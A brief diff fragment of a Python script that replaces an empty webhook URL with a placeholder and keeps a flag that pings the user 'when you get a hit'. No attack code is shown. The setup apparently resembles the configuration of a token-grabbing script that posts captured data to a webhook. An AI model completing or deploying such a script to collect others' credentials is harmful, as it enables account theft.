@@ -6,7 +6,7 @@ import webbrowser
 from urllib.request import Request, urlopen
 
 # your webhook URL (may need to google how to get this)
-WEBHOOK_URL = ''
+WEBHOOK_URL = 'ENTER WEBHOOK URL HERE'
 
 # mentions you when you get a hit
 PING_ME = True
